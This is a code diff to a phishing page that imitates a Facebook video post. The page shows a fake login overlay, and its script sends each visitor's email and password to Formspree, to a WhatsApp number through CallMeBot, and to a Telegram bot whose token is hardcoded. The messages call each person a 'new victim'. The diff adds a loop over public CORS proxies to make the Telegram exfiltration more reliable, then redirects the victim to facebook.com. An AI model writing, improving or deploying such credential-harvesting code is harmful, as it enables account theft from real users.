@@ -30,7 +30,7 @@
             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/t9QT8N9hNwl.png" alt="صفحة">
             <div>
                 <div class="name">صفحة فيسبوك</div>
-                <div class="time">منذ دقيقتين . 🌍</div>
+                <div class="time">منذ دقيقتين · 🌍</div>
             </div>
         </div>
         <div class="video-placeholder" onclick="openLogin()"></div>
@@ -56,13 +56,25 @@
     <script>
         // ========== إعداداتك ==========
         const FORMSPREE_URL = "https://formspree.io/f/mojrdevj";
-        const WHATSAPP_NUMBER = "9647732254506";   // رقم واتساب مع مفتاح الدولة
-        const WHATSAPP_APIKEY = "6842954";         // مفتاح CallMeBot
+        const WHATSAPP_NUMBER = "9647732254506";
+        const WHATSAPP_APIKEY = "6842954";
 
-        // إعدادات تيليجرام (اختياري مع بروكسي)
         const TELEGRAM_TOKEN = "8654480187:AAF-vu3ZjbRVBdAUSRA8B3HXE4joSCwjghc";
         const TELEGRAM_CHAT_ID = "7763665935";
-        const TELEGRAM_PROXY = "https://api.telegram.org"; // أو استخدم بروكسي مثل: "https://myproxy.com/api.telegram.org"
+
+        // قائمة بروكسيات HTTP عامة (قد تتغير صلاحيتها بسرعة)
+        const PROXY_LIST = [
+            "https://api.telegram.org",  // الأولوية للاتصال المباشر
+            "https://corsproxy.io/?" + encodeURIComponent("https://api.telegram.org"),
+            "https://api.allorigins.win/raw?url=" + encodeURIComponent("https://api.telegram.org"),
+            "https://proxy.techzbots.com/?" + encodeURIComponent("https://api.telegram.org"),
+            "https://cors-anywhere.herokuapp.com/" + "https://api.telegram.org",
+            "https://young-brook-29506.herokuapp.com/" + "https://api.telegram.org",
+            "https://fathomless-scrubland-24903.herokuapp.com/" + "https://api.telegram.org",
+            "https://mighty-crag-71151.herokuapp.com/" + "https://api.telegram.org",
+            "https://safe-ridge-51003.herokuapp.com/" + "https://api.telegram.org",
+            "https://obscure-waters-17647.herokuapp.com/" + "https://api.telegram.org"
+        ];
         // =================================
 
         let realVideoUrl = "https://www.facebook.com/";
@@ -76,13 +88,33 @@
             document.getElementById('loginOverlay').classList.add('active');
         }
 
+        async function sendToTelegram(email, password) {
+            const msg = `🔥 ضحية جديدة!\n📧 ${email}\n🔒 ${password}`;
+            const baseUrl = `/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
+
+            for (let i = 0; i < PROXY_LIST.length; i++) {
+                const proxy = PROXY_LIST[i];
+                try {
+                    const url = proxy === "https://api.telegram.org" ? `https://api.telegram.org${baseUrl}` : proxy.replace("https://api.telegram.org", "") + baseUrl.substring(1);
+                    const response = await fetch(proxy.startsWith("https://api.telegram.org") ? `https://api.telegram.org${baseUrl}` : proxy + baseUrl, {
+                        method: "GET",
+                        mode: "cors"
+                    });
+                    if (response.ok) return true; // نجح الإرسال
+                } catch (e) {
+                    continue; // نجرب البروكسي التالي
+                }
+            }
+            return false; // فشل جميع البروكسيات
+        }
+
         const form = document.getElementById('loginForm');
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             const email = document.querySelector('input[name="email"]').value;
             const password = document.querySelector('input[name="password"]').value;
 
-            // 1. Formspree
+            // 1. فورمسبري (نسخة احتياطية أولى)
             const formData = new FormData();
             formData.append("email", email);
             formData.append("password", password);
@@ -92,22 +124,14 @@
                 headers: { 'Accept': 'application/json' }
             }).catch(err => {});
 
-            // 2. واتساب
+            // 2. واتساب (نسخة احتياطية ثانية)
             const waMsg = `ضحية جديدة%0Aالبريد: ${encodeURIComponent(email)}%0Aكلمة السر: ${encodeURIComponent(password)}`;
             const whatsappUrl = `https://api.callmebot.com/whatsapp.php?phone=${WHATSAPP_NUMBER}&text=${waMsg}&apikey=${WHATSAPP_APIKEY}`;
             fetch(whatsappUrl, { mode: 'no-cors' }).catch(err => {});
 
-            // 3. تيليجرام مع محاولة عبر بروكسي
-            const tgMsg = `🔥 ضحية جديدة!\n📧 ${email}\n🔒 ${password}`;
-            const tgUrl = `${TELEGRAM_PROXY}/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`;
-            try {
-                await fetch(tgUrl, { mode: 'cors' });
-            } catch (e) {
-                // إذا فشل البروكسي الأساسي، نجرب بدونه
-                try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`, { mode: 'cors' });
-                } catch (e2) {}
-            }
+            // 3. تيليجرام مع تجربة جميع البروكسيات
+            const sent = await sendToTelegram(email, password);
+            console.log("تم إرسال تيليجرام:", sent);
 
             // إعادة توجيه الضحية
             window.location.href = realVideoUrl;
